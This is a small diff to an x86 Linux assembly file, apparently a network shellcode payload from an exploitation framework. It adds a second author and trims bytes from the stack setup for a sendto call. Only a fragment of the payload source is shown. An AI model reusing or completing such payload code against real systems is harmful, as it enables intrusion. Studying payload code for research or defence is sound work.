@@ -4,6 +4,7 @@
 ;   Qualities: Can Have Nulls
 ;   Platforms: Linux
 ;     Authors: skape <mmiller [at] hick.org>
+               vlad902 <vlad902 [at] gmail.com>
 ;     Version: $Revision$
 ;     License: 
 ;
@@ -43,13 +44,11 @@ sendto:
 	mov  ecx, esp
 	push edx
 	push edx
-	mov  dl, 0x8
 	push word 0xfff7
-	push word dx
+	o16 push byte 0x8
 	mov  edi, esp
 	push byte 0x10
 	push ecx
-	cdq
 	push edx
 	push byte 0x9
 	push edi
